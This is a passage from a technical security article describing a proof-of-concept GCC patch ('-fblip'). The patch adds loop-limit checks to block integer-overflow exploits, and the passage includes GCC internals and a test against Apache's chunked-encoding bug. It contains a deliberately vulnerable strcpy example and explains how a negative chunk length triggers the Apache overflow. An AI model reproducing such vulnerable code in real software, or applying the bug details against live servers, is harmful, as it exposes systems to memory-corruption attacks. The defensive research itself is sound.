which of the available &quot;Front End&quot;s is good for parsing the input files, 
and will execute that  &quot;Front End&quot;. The &quot;Front End&quot; will parse the whole 
input file and will convert it (using many global helper functions) to an 
&quot;Abstract Syntax Tree&quot; (AST). By doing so the &quot;Front End&quot; makes the 
original programming language transparent to the gcc &quot;Back End&quot;. The AST 
as its name suggests, is a data-structure, which resides in memory and 
can represent all the features of all the programming languages gcc 
supports. 

Whenever the &quot;Front End&quot; finishes to parse a complete function, and 
converts it to an AST representation, a gcc function called 
rest_of_compilation is being called. This function takes down the AST 
output from the parser and &quot;expands&quot; it into a &quot;Register Transfer 
Language&quot; (RTL). The RTL, which is the &quot;expanded&quot; version of the AST, is 
then processed again and again through the many different phases of 
compilation. 

To get a feeling for work that is done on the RTL tree, a subset 
list of the different phases is:
 - Jump Optimization
 - CSE (Common sub-expression elimination)
 - Data flow analysis
 - Instruction combination
 - Instruction scheduling
 - Basic block reordering
 - Branch shortening
 - Final (code generation)

I&#039;ve selected only a few phases out of the big list of phases to 
demonstrate the work done on RTL. The full list is quite more extensive 
and can be found in the gcc internal docs (see &quot;Getting started&quot; for link 
to docs). The nice thing about RTL is that all those phases are performed 
independent of the target machine. 

The last phase which is performed on the RTL tree, will be the &quot;final&quot; 
phase. At that point the RTL representation is ready to be substituted by 
actual assembly instructions that deal with the specific architecture. 
This phase is possible due to the fact that the gcc maintains an abstract 
definition of &quot;machine modes&quot;. A set of files that can describe each 
supported machine hardware, and instruction set in a way that makes it 
possible to translate RTL to the appropriate machine code.


------[ 4.3.2 - The AST

I will now focus on the AST, which I will refer to as the &quot;TREE&quot;. This 
TREE is the output of the front end parsing of a language file. The TREE 
contains all the information existing in the source file which is 
required for code generation (e.g. declaration, functions, types..). In 
addition the TREE also includes some of the attributes and implicit 
transformations that the compiler may choose to perform (e.g. type 
conversion, auto variables..). 

Understanding the TREE is critical for creating this patch. Fortunately 
the TREE is well structured and even if its object-oriented-like-
programming-using-c is overwhelming at first, after a few debugging 
sessions, every thing starts to fall in place. 

The core data structure of the TREE is the tree_node (defined in tree.h). 
This structure is actually one big union that can represent any piece of 
information. The way it works is that any tree node has its code, which 
is accessible using &quot;TREE_CODE (tree node)&quot;. Using this code the compiler 
may know which of the union fields are relevant for that node (e.g. A 
constant number will have the TREE_CODE() == INTEGER_CST, therefore the 
node-&gt;int_cst is going to be the union member that will have the valid 
information.). As a note, I will say that there is no need to access any 
of the tree node structure fields directly. For each and every field in 
that structure there is a dedicated macro that uniforms the access to 
that field. In most cases this macro will contain some additional checks 
of the node, and maybe even some logic to execute whenever access to that 
field is made (e.g. DECL_RTL which is responsible to retrieve the RTL 
representation of a TREE node, will call make_decl() if no RTL expression 
exists for that node).

So we know about the TREE and tree node, and we know that each node can 
represent many different things, what else is important to know about the 
tree nodes? Well, one thing is the way tree nodes are linked to each 
other. I will try to give a few sample scenarios that represent most of 
the cases where one tree node is related to another one.

Reference I - Chains:
A chain is a relation that can be best described as a list. When the 
compiler needs to maintain a list of nodes *that don&#039;t have any link-
related information*, it will simply use the chain field of the tree node 
(accessible using the TREE_CHAIN() macro). An example for such a case is 
the list of statements nodes in a function body. For each statement in a 
COMPOUND_STMT list there is a chained statement that represents the 
following statement in the code.

Reference II - Lists:
Whenever simple chaining is not enough, the compiler will use a special 
tree node code of TREE_LIST. TREE_LIST allows the compiler to save some 
information attached to each item on the list. To do so each item in the 
list is represented by three tree nodes. The first tree node will have 
the code TREE_LIST. This tree node will have the TREE_CHAIN pointing to 
the next node in the list. It will have the TREE_VALUE pointing to the 
actual tree node item, and it will also have TREE_PURPOSE which may point 
to another tree node that holds extra information about this item meaning 
in the list. As an example the tree node of code CALL_EXPR, will have a 
TREE_LIST as its second operand. This list will represent the parameters 
sent to the called function.

Reference III - Direct reference:
Many of the tree node fields are tree nodes themselves. It may be 
confusing at first glance, but it will be clear soon enough. A few common 
examples are:
 - TREE_TYPE this field represent the type of a tree node. For example 
each tree node with expression code must have a type. 

 - DECL_NAME whenever some declaration tree nodes have a name, it will 
not exist as a string pointed directly by the declaration tree node. 
Instead using the DECL_NAME one can get access to another tree node of 
code IDENTIFIER_NODE. The latter will have the requested name 
information.

 - TREE_OPERAND() One of the most commonly used references. Whenever 
there is a tree node, which has a defined number of &quot;child&quot; tree nodes, 
the TREE_OPERAND() array will be used (e.g. tree node of code IF_STMT 
will have TREE_OPERAND(t,0) as a COND_EXPR node, TREE_OPERAND(t,1) as the 
THEN_CLAUSE statement node, and TREE_OPERAND(t,2) as the ELSE_CLAUSE 
statement tree node.)

Reference IV - Vectors:
Last and quite less common is the tree node vector. This container, which 
is accessible using the TREE_VEC_XXX macros, is used to maintain varying 
size vectors.
 
There is a lot more to know about AST tree nodes for which the gcc 
internal documents may have better and more complete explanations. So I 
will stop my AST overview here with a suggestion to read the docs.

In addition to storing the abstract code in the AST. There are several 
global structures, which are being extensively used by the compiler. I 
will try to name a few of those global structures that I found very 
useful to checkout while doing some debugging sessions.

  - current_stmt_tree : provides the last added stmt to the tree , last 
expression type, and the expression file name.

  - current/global_binding_level : provides binding information, 
such as defined names in a particular binding level, and block pointers

  - lineno : var containing the line number that is parsed at the moment
  - input_filename: file name that is parsed at the moment

------[ 4.3.3 - Getting started 

If you want to experience the AST tree yourself, or to dig into the patch 
details, it is recommended to read this getting started section. You are 
safe to continue to the next section if you do not wish to do that.

First thing first, get the compiler source code. The version I used as 
base for this patch is gcc 3.2. For information about download and build 
of the compiler please check http://gcc.gnu.org/install/ 

(Please remember to specify the compiler version you wish to download. 
The default version may be the last-release, which was not checked 
against this patch)

Next thing you may want to do is to sit down and carefully read the gcc 
internal documents. ( For the sake of this patch, you should be familiar 
with the first 9 sections of this document ) The document is located 
http://gcc.gnu.org/onlinedocs/gccint/

Assuming you read the document and you want to go to the next level, I 
recommend to have a set of simple programs to be used as compiler 
language file, your debugger of choice, and start debugging the compiler. 
Some good break points that you might find useful are:

  - add_stmt : called whenever the parser decides to add a new statement 
into the AST. This break point may be very handy when it is not so clear 
how a specific tree node is being created. By breaking on add_stmt and 
checking up the call stack, it is easy to find more interesting places to 
dig into.

  - rest_of_compiliation : called whenever a function was completely 
converted into AST representation. If you are interested to check out how 
the AST is turning into RTL this is a good place to start.

  - expand_stmt: called each time a statement is about to be expanded 
into RTL code. Setting a Break point here will allow you to easily 
investigate the structure of an AST tree node without the need to go 
through endless nesting levels. 

&lt;TIP&gt; Since the gcc compiler will end up calling the cc1 compiler for *.c 
files, you may want to debug cc1 in the first place, and save yourself 
the trouble of making your debugger follow the child process of gcc 
&lt;/TIP&gt;

Soon enough you will need some reference for all the little macros used 
while messing with the AST tree. For that I recommend getting familiar 
with the following files:

gcc3.2/gcc/gcc/tree.h
gcc3.2/gcc/gcc/tree.def


----[ 4.4 - Patch Goals 


Like every project in life, you have to define the project goals.  First 
you better know if you reached your goals. Second, which is not less 
important, since resources are limited, it is much easier to protect 
yourself from a never-ending project. 

The goals of this patch were above all to be a proof of concept for the 
suggested integer exploits prevention scheme. Its therefore *not* a goal 
to solve all current and future problems in the security world, or even 
not to solve all exploits that have integer input related to them.

The second goal of this implementation is to keep the patch simple. Since 
the patch is only a proof of concept, we preferred to keep things simple 
and avoid fancy solutions if they required more complex code. 


Last but not least the third goal is to make this patch usable. That 
means easy to use, intuitive, and able to protect real world packages 
bigger then 30 lines of code :).

----[ 4.5 - Patch overview

The patch will introduce a new flag to the gcc compiler named &quot;blip&quot;. By 
compiling a file using the -fblip flag,  the compiler  generates code 
that will check for the &quot;blip&quot; condition for every for/while loop and for 
every call to a &quot;loop like&quot; function.

A &quot;loop like&quot; function is any function that is a synonym for a loop. 
(e.g. memcpy, bcopy, memset, etc.).

The generated check, will evaluate if a loop is about to execute a &quot;Huge&quot; 
number of times. (defined by LIBP_MAX). Each time a loop is about to 
execute, the generated code verifies that the loop limit is smaller than 
the threshold. If an attempt to execute a loop more than the threshold 
value is identified, the __blip_violation() handler will be called 
instead of the loop, leading to a controlled termination of the 
processes.

The current version of the patch will support only the C language. This 
decision was made in order to keep this first version of the patch small 
and simple. Also, all the vulnerable packages that this patch was planned 
to protect are written in C. So I thought that having only C is a good 
start.


------[ 4.5.1 - Tactics

Having the above goals in mind, I had to take some decisions during the 
development of the patch. One of the problems I had was to choose the 
right place to hack the code. There are quite a lot of options available, 
and I will try to give some pros and cons for each option, hoping it will 
help others to make educated decisions once they encounter the same 
dilemmas.

The first thing that I had to decide was the program representation I 
want to modify. The process of compilation looks more or less like that:

Processing		Program representation
------------		------------
Programming =&gt;	1. Source code
Parsing =&gt; 		2. AST
Expanding =&gt; 	3. RTL
&quot;final&quot; =&gt;		4. Object file

So what is the right place to implement the checks? 

The following table lists some of the pros and cons for modifying the 
code at different stages during the compilation process.
+-------------+-----------------------------+---------------------------+
|Stage        |Pros                         | Cons                      |
+-------------+-----------------------------+---------------------------+
| AST         |- Target independent         |- No access to hardware    |
|             |- Language independent       |  Registers, instructions  |
|             |- Optimization independent   |                           |
|             |- High level Access to       |                           |
|             |  language &quot;source&quot;          |                           |
|             |- Intuitive to add code      |                           |
+-------------+-----------------------------+---------------------------+
| RTL         |- Target independent         |- Low level &quot;source&quot; access|
|             |- Language independent       |- May interfere with       |
|             |- Full access to target      |  optimization             |
|             |  hardware                   |                           |
+-------------+-----------------------------+---------------------------+
| Object file |- Language independent       |- Hardware dependent       |
|             |                             |- Lack syntax information  |
|             |                             |- Modification of flow may |
|             |                             | break compiler logic      |
+-------------+-----------------------------+---------------------------+

After some thought I decided to modify the AST representation. It seems 
to be the most natural place to do such a change. First, the patch 
doesn&#039;t really need to access low-level information such as hardware 
registers, or even virtual registers allocations. Second, the patch can 
easily modify the AST to inject custom logic into it, while doing the 
same at the RTL level will require major changes, which will hurt the 
abstraction layers defined in gcc.


Solving my second dilemma was not as easy as the first one. Now that AST 
patching was the plan I had in mind, I needed to find the best point in 
time in which I will examine the existing AST tree, and emit my checks on 
it. I had three possible options. 

1) Add a call to my function from the parser code of some language (which 
happened to be C).  By doing so, I have the chance to evaluate and modify 
the tree &quot;on the fly&quot; and therefore save an extra pass over the tree 
later. A clear disadvantage is the patch becomes language dependent. 

2) Wait until the whole function is parsed by the front-end.  Then go 
through the created tree, before converting it to RTL and find the 
places, which require checks, and patch them. An advantage of this method 
is that the patch is no longer language dependent. On the other hand, 
implementing a &quot;tree walk&quot; that will scan a given tree, is quite complex 
and error prone task, which will go against the goals we defined above 
such as simple, and useful patch. 

3) Patch the AST tree *while* it is being converted into RTL. Although 
this option looks like the most advantageous (language independent, no 
need for a tree walk) it still has a major disadvantage which is the 
uncertainty of being able to *safely* modify the AST tree at that time. 
Since the RTL &quot;conversion machine&quot; is already processed some parts of the 
AST tree, it might be dangerous to patch the AST tree at that time.

Finally, I have decided that the goal of making this patch simple, 
implies selecting the first option of calling my evolution functions from 
the C parser.

I&#039;ve placed the hook into my patch in three locations. Two calls inside 
the c-parse.y (main parser file) code allowing me to examine the FOR and 
WHILE loops and to modify them on the fly. The third call is located 
outside the parser since catching all call locations was quite tricky to 
do from within the parser. Basically since in many different situations a 
CALL_EXPR is created hooking all of them seems to be non-natural. The 
alternative that I found which seems to work just fine for me, was to add 
a call to my function inside the build_function_call() within the c-
typeck.c file (C compiler type-checking expression builder).

The main entry into the patch is the blip_check_loop_limit() function 
which will do all the work of checking if a loop seems to be relevant, 
and to call the right function that will do the actual patching of the 
AST tree.

In order for a loop to be considered it needs to look like a count loop. 
The blip patch will therefore try to examine each loop and decide if the 
loop seems to be a counter loop (exact criteria for examining loops will 
follow). For each count loop an attempt is made to detect the &quot;count&quot; 
variable and the &quot;limit&quot; variable.

Example of simple loops and their variables:
 - for(i=0; i &lt; j; i+=3}{;} ==&gt; Increment loop, i = count j = limit.
 - while(len--){;} ==&gt; decrement loop, len = counter ; 0 = limit.

The current implementation considers a loop as count loop only if:
 - 2 variables are detected in the loop condition 
   (sometimes one of them can be a constant)
 - one of those variables is modified in the loop condition or in the 
loop expr
 - *only one* variable is modified
 - the modification is of the increment / decrement style (++,--,+=,-=)

The code, which examines the loop, is executed in blip_find_loop_vars() 
and it may be improved in the future to identify more loops as count 
loops.

After detecting the loop direction, the loop count and the limit, the AST 
tree is modified to include a check that verifies that a big loop is 
reported as a blip violation.

In order to keep the patch simple and risk free, any time a loop seems 
too complex to be understood as count loop, the loop will be ignored 
(Using the blip warning flags its possible to list the ignored loops, and 
the reason why they were ignored). 


------[ 4.5.2 - Modifying the AST

When you start patching complex applications such as gcc, you want to 
make sure you are not causing any &quot;butterfly effect&quot; while modifying 
memory resident structures on the fly. To save yourself from a lot of 
trouble I will suggest avoiding modification to any structure directly. 
But instead use the existing functions that the language parser would 
have used if the code you want to &quot;inject&quot; was found in the original 
source code. Following this layer of encapsulation will save you from 
making mistakes such as forgetting to initialize a structure member, or 
not updating another global variable or flag. 

I found it very helpful to simulate the code injection by actually 
modifying the source code, and tracing the compiler as it builds the AST 
tree, and later mimicking the code creation by using the same functions 
used by the parser to build my new check code. This way I was able to 
eliminate the need of &quot;dirty&quot; access to the AST tree, which I was quite 
afraid of while starting the modification.

Knowing the right set of functions to use to inject any code I would 
like, the question became what would I really like to inject? The answer 
differs a bit between the different loop types. In the case of a for-loop 
the blip patch will add the check expression as the last expression in 
the FOR_INIT statement. In the case of the while loop the blip patch will 
add the check expression as a new statement before the while loop. In the 
case of a function call to a &quot;loop like&quot; function such as memcpy, the 
blip patch will replace the whole call expression with a new condition 
expression, having the __blip_violation on the &quot;true&quot; side, and the 
original call expression on the &quot;false&quot; side.

Let&#039;s illustrate the last paragraph with some samples..

Before blip
-----------

1) for(i=0;i&lt; len;i++){}

2) While(len--){}	

3) p = memcpy(d,s,l)


After blip
----------

1) for(i=0,&lt;blip_check&gt;?__blip_violation:0;i&lt;len;i++){}

2) &lt;blip_check&gt;?__blip_violation:0;
   while(len--){}

3) p = &lt;blip_check&gt;?__blip_violation : memcpy(d,s,l)


The &lt;blip_check&gt; itself is quite simple. If the loop is incremental 
(going up) then the check will look like: (limit &gt; count &amp;&amp; limit-count &gt; 
max).  If the loop is going down the check will be (count &gt; limit &amp;&amp; 
count - limit &gt; max). There is a need to check the delta between the 
count and the limit and not only the limit since we don&#039;t want to trigger 
false positive in a loop such as:

len = 0xffff0000;
for(i=len-20;i &lt; len; i++){};

The above example may look at first like an integer exploit. But it may 
also be a legitimate loop which simply happens to iterate over very high 
values.

The function responsible for building the &lt;blip_check&gt; is 
blip_build_check_exp(), and its the code is self-explanatory, so I will 
not duplicate the function comments here.	

One of the difficulties I had while injecting the blip code, was the 
injection of the __blip_violation function into the target file. While 
creating the &lt;blip_check&gt; I simply created expressions which reference 
the same tree nodes I found in the loop condition or as parameter to the 
loop like function call. But the __blip_violation function didn&#039;t exist 
in the name space of the compiled file, and therefore trying to reference 
it was a bit trickier, or so I thought. Usually when a CALL_EXPR is 
created, a FUNCTION_DECL is identified (as one of the available function 
visible to the caller) and an ADDR_EXPR is later created to express the 
address of the declared function.  Since __blip_violation was not 
declared , attempts to execute lookup_name() for that name will yield 
an empty declaration. 

Fortunately gcc was kind / forgiving enough, and I was able to build a 
FUNCTION_DECL and reference it leaving all the rest of the work for the 
RTL to figure out. The code, which builds the function call, is located 
in blip_build_violation_call(). The function body of __blip_violation is 
located in the libgcc2.c (Thanks for ProPolice for giving an example..).

&lt;DISCLAIMER&gt; All the modification above is being done in the spirit of 
proof of concept for the blip integer exploits detection. There is no 
warranty that the patch will actually increase the protection of any 
system, nor that it will keep the compiler stable and usable (while using 
-fblip), nor that any of the coding / patching recommendation made in the 
article will make any sense to the hardcore maintainer of the gcc project 
:&gt;.&lt;/DISCLAIMER&gt;

----[ 4.6 - Limitations

This section summarizes the limitations known to me at the time of 
writing this article. I will start from the high-level limitations going 
to the low level technical limitations. 

 - The first limitation is the coverage of the patch. The patch is 
designed to stop integer vulnerabilities that yield big loops. Other 
vulnerabilities that are due to bad design or lack of integer validation 
will not be protected. 

For example the following code is vulnerable but cannot be protected by 
the patch:

void foo(unsigned int len,char* buf){

	char	dst[10];

	if(len &lt; 10){
		strcpy(dst,buf);
	}
}


 - Sometimes a generic integer overflow done &quot;by the book&quot; will not be 
detected. An example for such a case will be the xdr_array vulnerability. 
The problem is due to the fact that the malloc function was called with 
the overflowed expression of *two* different integer input, while the 
blip protection can handle only a single big count loop. When looking at 
the xdr_array loop, we can see that it will be easy for the attacker to 
supply such input integers, that will overflow the malloc expression, but 
will still keep the loop count small.


 - Some count loops will not be considered. One example is a complex 
loop condition and it is non trivial to identify the count loop. Such 
loops must be ignored, or otherwise false positives may occur which may 
lead to undefined execution.

 - [Technical limitation] The current version is designed to work only 
with C language. 

 - [Technical limitation] The current version will not examine embedded 
assembly code which may include &quot;loop&quot; instructions. Therefore allowing 
integer overflow exploitation to go undetected.

--[ 5 - References

[1] StackGuard 
    Automatic Detection and Prevention of Stack Smashing Attacks
    http://www.immunix.org/StackGuard/

[2] ProPolic 
    GCC extension for protecting applications from stack-smashing attacks
    http://www.trl.ibm.com/projects/security/ssp/

[3] GCC
    GNU Compiler Collection
    http://gcc.gnu.org

[4] noir
    Smashing The Kernel Stack For Fun And Profit
    Phrack Issue #60, Phile 0x06 by noir

[5] Halvar Flake
    Third Generation Exploits on NT/Win2k Platforms
    http://www.blackhat.com/presentations/bh-europe-01/halvar-flake/bh-
europe-01-halvarflake.ppt

[6] MaXX
    Vudo malloc tricks
    Phrack Issue 0x39, Phile #0x08

[7] Once upon a free()..
    Phrack Issue 0x39, Phile #0x09

[8] Aleph One
    Smashing The Stack For Fun And Profit
    Phrack Issue 0x31, Phile #0x0E


--[ 6 - Thanks

I want to thanks my team for helping me in the process of creating the 
paper. Thank you Monty, sinan, yona, shok for your helpful comments and 
ideas for improving the paper. If you think the English in this paper is 
broken imagine what my team had to go through :&gt;. Without you guys I 
would never made it.

Thanks to anonymous :&gt; for read proofing the paper, and providing helpful 
technical feedback and reassurance.

--[ 7 - Appendix A - Real life examples

Having the patch ready, I wanted to give it a test drive on one of the 
known and high profile vulnerabilities. The criteria used for checking 
the patch was: 

 - The package should be compiled successfully with the patch 
 - The patch should be able to protect the package against exploitation 
of the known bugs

I&#039;ve selected to test the patch on Apache httpd and the OpenSSH packages. 
Since both packages are: high profile, have vulnerabilities that the 
patch should is expected to protect against (in vulnerable version), and 
they are big enough to &quot;qa&quot; the patch a little bit.


The protection test was proven to be successful:), and the vulnerable 
version compiled with -fblip proved to be non exploitable. 

The following section explains how to compile the packages with the blip 
patch. We will show the output assembly generated before / after the 
patch for the code which was enabling the exploit to overflow the program 
buffers.

----[ 7.1 - Apache Chunked encoding

--[ Vulnerability info

Just to make sure that all are in sync with the issue of the apache 
chunked-encoding vulnerability I will list part of the vulnerable code 
followed by some explanation.

Code: Apache src/main/http_protocol.c : ap_get_client_block()

01 len_to_read = get_chunk_size(buffer);

&lt;some code here...&gt;

02 r-&gt;remaining = len_to_read;

&lt;some code here...&gt;

03 len_to_read = (r-&gt;remaining &gt; bufsiz) ? bufsiz : r-&gt;remaining;
04 len_read = ap_bread(r-&gt;connection-&gt;client, buffer , len_to_read);


The vulnerability in this case allows a remote attacker to send a 
negative chunk length. Doing so will bypass the check at line 3, and will 
end up with calling the ap_bread() with a huge positive number. 

--[ Testing patch

To compile the apache httpd with the -fblip enabled, one may edit the 
file src/apaci and add the following line at the EOF &quot;echo &#039;-fblip&#039;&quot;.

Any attempt to send a negative chunk length after compiling apache httpd 
with the blip patch will end up with the httpd executing the 
__blip_violation.

According to the blip theory, the attack should trigger some kind of a 
loop. We can see at line 4 of the listed code that a call is made to the 
ap_bread() function. So if the theory is correct we are supposed to find 
a loop inside that function. 


/*
 * Read up to nbyte bytes into buf.
 * If fewer than byte bytes are currently available, then return those.
 * Returns 0 for EOF, -1 for error.
 * NOTE EBCDIC: The readahead buffer _always_ contains *unconverted* 
data.
 * Only when the caller retrieves data from the buffer (calls bread)
 * is a conversion done, if the conversion flag is set at that time.
 */
API_EXPORT(int) ap_bread(BUFF *fb, void *buf, int nbyte)
{
    int i, nrd;

    if (fb-&gt;flags &amp; B_RDERR)
	return -1;
    if (nbyte == 0)
	return 0;

    if (!(fb-&gt;flags &amp; B_RD)) {
	/* Unbuffered reading.  First check if there was something in the
	 * buffer from before we went unbuffered. */
	if (fb-&gt;incnt) {
	    i = (fb-&gt;incnt &gt; nbyte) ? nbyte : fb-&gt;incnt;
#ifdef CHARSET_EBCDIC
	    if (fb-&gt;flags &amp; B_ASCII2EBCDIC)
		ascii2ebcdic(buf, fb-&gt;inptr, i);
	    else
#endif /*CHARSET_EBCDIC*/
	    memcpy(buf, fb-&gt;inptr, i);
	    fb-&gt;incnt -= i;
	    fb-&gt;inptr += i;
	    return i;
	}
	i = read_with_errors(fb, buf, nbyte);
#ifdef CHARSET_EBCDIC
	if (i &gt; 0 &amp;&amp; ap_bgetflag(fb, B_ASCII2EBCDIC))
	    ascii2ebcdic(buf, buf, i);
#endif /*CHARSET_EBCDIC*/
	return i;
    }

    nrd = fb-&gt;incnt;
/* can we fill the buffer */
    if (nrd &gt;= nbyte) {
#ifdef CHARSET_EBCDIC
	if (fb-&gt;flags &amp; B_ASCII2EBCDIC)
	    ascii2ebcdic(buf, fb-&gt;inptr, nbyte);
	else
#endif /*CHARSET_EBCDIC*/
	memcpy(buf, fb-&gt;inptr, nbyte);
	fb-&gt;incnt = nrd - nbyte;
	fb-&gt;inptr += nbyte;
	return nbyte;
    }

    if (nrd &gt; 0) {
#ifdef CHARSET_EBCDIC
	if (fb-&gt;flags &amp; B_ASCII2EBCDIC)
	    ascii2ebcdic(buf, fb-&gt;inptr, nrd);
	else
#endif /*CHARSET_EBCDIC*/
	memcpy(buf, fb-&gt;inptr, nrd);
	nbyte -= nrd;
	buf = nrd + (char *) buf;
	fb-&gt;incnt = 0;
    }
    if (fb-&gt;flags &amp; B_EOF)
	return nrd;

/* do a single read */
    if (nbyte &gt;= fb-&gt;bufsiz) {
/* read directly into caller&#039;s buffer */
	i = read_with_errors(fb, buf, nbyte);
#ifdef CHARSET_EBCDIC
	if (i &gt; 0 &amp;&amp; ap_bgetflag(fb, B_ASCII2EBCDIC))
	    ascii2ebcdic(buf, buf, i);
#endif /*CHARSET_EBCDIC*/
	if (i == -1) {
	    return nrd ? nrd : -1;
	}
    }
    else {
/* read into hold buffer, then memcpy */
	fb-&gt;inptr = fb-&gt;inbase;
	i = read_with_errors(fb, fb-&gt;inptr, fb-&gt;bufsiz);
	if (i == -1) {
	    return nrd ? nrd : -1;
	}
	fb-&gt;incnt = i;
	if (i &gt; nbyte)
	    i = nbyte;
#ifdef CHARSET_EBCDIC
	if (fb-&gt;flags &amp; B_ASCII2EBCDIC)
	    ascii2ebcdic(buf, fb-&gt;inptr, i);
	else
#endif /*CHARSET_EBCDIC*/
	memcpy(buf, fb-&gt;inptr, i);
	fb-&gt;incnt -= i;
	fb-&gt;inptr += i;
    }
    return nrd + i;
}

 
We can see in the code several possible execution flows. Each one of them 
includes a &quot;loop&quot; that moves all the data into the buf parameter. If the 
code supports CHARSET_EBCDIC then the ascii2ebdcdic function executes the 
deadly loop. On other normal cases, the memcpy function implements the 
deadly loop. 

Following is the assembly code generated for the above function. 

	.type	ap_bread,@function
ap_bread:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	%ebx, -12(%ebp)
	movl	%esi, -8(%ebp)
	movl	%edi, -4(%ebp)
	movl	8(%ebp), %edi
	movl	16(%ebp), %ebx
	testb	$16, (%edi)
	je	.L68
	movl	$-1, %eax
	jmp	.L67
.L68:
	movl	$0, %eax
	testl	%ebx, %ebx
	je	.L67
	testb	$1, (%edi)
	jne	.L70
	cmpl	$0, 8(%edi)
	je	.L71
	movl	8(%edi), %esi
	cmpl	%ebx, %esi
	jle	.L72
	movl	%ebx, %esi
.L72:
	cmpl	$268435456, %esi          ------------------------
	jbe	.L73
	movl	%esi, (%esp)               Blip Check (Using esi)
	call	__blip_violation
	jmp	.L74                      ------------------------
.L73:
	movl	4(%edi), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%esp)
	movl	%eax, 4(%esp)
	movl	%esi, 8(%esp)
	call	memcpy
.L74:
	subl	%esi, 8(%edi)
	addl	%esi, 4(%edi)
	movl	%esi, %eax
	jmp	.L67
.L71:
	movl	%edi, (%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%ebx, 8(%esp)
	call	read_with_errors
	jmp	.L67
.L70:
	movl	8(%edi), %edx
	movl	%edx, -16(%ebp)
	cmpl	%ebx, %edx
	jl	.L75
	cmpl	$268435456, %ebx          ------------------------
	jbe	.L76
	movl	%ebx, (%esp)               Blip check (using ebx)
	call	__blip_violation
	jmp	.L77                      ------------------------
.L76:
	movl	4(%edi), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%esp)
	movl	%eax, 4(%esp)
	movl	%ebx, 8(%esp)
	call	memcpy
.L77:
	movl	-16(%ebp), %eax
	subl	%ebx, %eax
	movl	%eax, 8(%edi)
	addl	%ebx, 4(%edi)
	movl	%ebx, %eax
	jmp	.L67
.L75:
	cmpl	$0, -16(%ebp)
	jle	.L78
	cmpl	$268435456, -16(%ebp)     ------------------------
	jbe	.L79
	movl	-16(%ebp), %eax             Blip check
	movl	%eax, (%esp)                (using [ebp-16])
	call	__blip_violation
	jmp	.L80                      ------------------------
.L79:
	movl	4(%edi), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%esp)
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	call	memcpy
.L80:
	subl	-16(%ebp), %ebx
	movl	-16(%ebp), %edx
	addl	%edx, 12(%ebp)
	movl	$0, 8(%edi)
.L78:
	testb	$4, (%edi)
	je	.L81
	movl	-16(%ebp), %eax
	jmp	.L67
.L81:
	cmpl	28(%edi), %ebx
	jl	.L82
	movl	%edi, (%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%ebx, 8(%esp)
	call	read_with_errors
	movl	%eax, %esi
	cmpl	$-1, %eax
	jne	.L85
	jmp	.L91
.L82:
	movl	20(%edi), %eax
	movl	%eax, 4(%edi)
	movl	%edi, (%esp)
	movl	%eax, 4(%esp)
	movl	28(%edi), %eax
	movl	%eax, 8(%esp)
	call	read_with_errors
	movl	%eax, %esi
	cmpl	$-1, %eax
	jne	.L86
.L91:
	cmpl	$0, -16(%ebp)
	setne	%al
	movzbl	%al, %eax
	decl	%eax
	orl	-16(%ebp), %eax
	jmp	.L67
.L86:
	movl	%eax, 8(%edi)
	cmpl	%ebx, %eax
	jle	.L88
	movl	%ebx, %esi
.L88:
	cmpl	$268435456, %esi          ------------------------
	jbe	.L89
	movl	%esi, (%esp)               Blip check (using esi)
	call	__blip_violation
	jmp	.L90                      ------------------------
.L89:
	movl	4(%edi), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%esp)
	movl	%eax, 4(%esp)
	movl	%esi, 8(%esp)
	call	memcpy
.L90:
	subl	%esi, 8(%edi)
	addl	%esi, 4(%edi)
.L85:
	movl	-16(%ebp), %eax
	addl	%esi, %eax
.L67:
	movl	-12(%ebp), %ebx
	movl	-8(%ebp), %esi
	movl	-4(%ebp), %edi
	movl	%ebp, %esp
	popl	%ebp
	ret


One can notice that before any call to the memcpy function (which is one 
of the &quot;loop like&quot; functions), a little code was added which calls 
__blip_violation in the case the 3rd parameter of memcpy is bigger than 
blip_max. 

Another thing worth mentioning is the way the injected check is accessing 
this 3rd parameter. In the first block of the injected code the parameter 
is stored at the esi register, at the second block the parameter is 
stored in the ebx register and in the third block the parameter is stored 
on the stack at ebp-16. The reason for that is very simple. Since the 
modification of the code was done at the AST tree, and since the patch 
was using the exact same tree node that was used in the call expression 
to memcpy, the RTL generated the same code for both the call expression 
and the check expression. 

Now lets go back to the ap_bread function. And lets assume that the 
CHARSET_EBCDIC was indeed defined. In that case the ascii2ebcdic function 
would have being the one to have the &quot;vulnerable&quot; loop. Therefore we hope 
that the blip patch would check the loop in that function as well.


The following is the ascii2ebcdic code taken from src/ap/ap_ebcdic.c

API_EXPORT(void *)
ascii2ebcdic(void *dest, const void *srce, size_t count)
{
    unsigned char *udest = dest;
    const unsigned char *usrce = srce;

    while (count-- != 0) {
        *udest++ = os_toebcdic[*usrce++];
    }

    return dest;
}


 
Result of compiling the above function with the -fblip 

	.type	ascii2ebcdic,@function
ascii2ebcdic:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$12, %esp
	movl	16(%ebp), %ebx
	movl	8(%ebp), %edi
	movl	12(%ebp), %esi
	cmpl	$0, %ebx            -------------------
	jbe	.L12
	cmpl	$268435456, %ebx
	jbe	.L12                   Blip check
	movl	%ebx, (%esp)
	call	__blip_violation
.L12:                            -------------------
	decl	%ebx
	cmpl	$-1, %ebx
	je	.L18
.L16:
	movzbl	(%esi), %eax
	movzbl	os_toebcdic(%eax), %eax
	movb	%al, (%edi)
	incl	%esi
	incl	%edi
	decl	%ebx
	cmpl	$-1, %ebx
	jne	.L16
.L18:
	movl	8(%ebp), %eax
	addl	$12, %esp
	popl	%ebx	
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe2:

While processing the ascii2ebcdic function, the blip patch identified the 
while loop as a count-loop. The loop condition supplies all the 
information required to create a &lt;blip_check&gt;. First we identify the 
variables of the loop. In this case &quot;count&quot; is one var and the constant 
&quot;0&quot; is the second one. Looking for variable modification, we can see that 
&quot;count&quot; is decremented in the expression &quot;count--&quot;. Since &quot;count&quot; is the 
only modified variable we can say that &quot;count&quot; is the count-variable and 
the constant 0 is the limit-variable. We can also say that the loop is a 
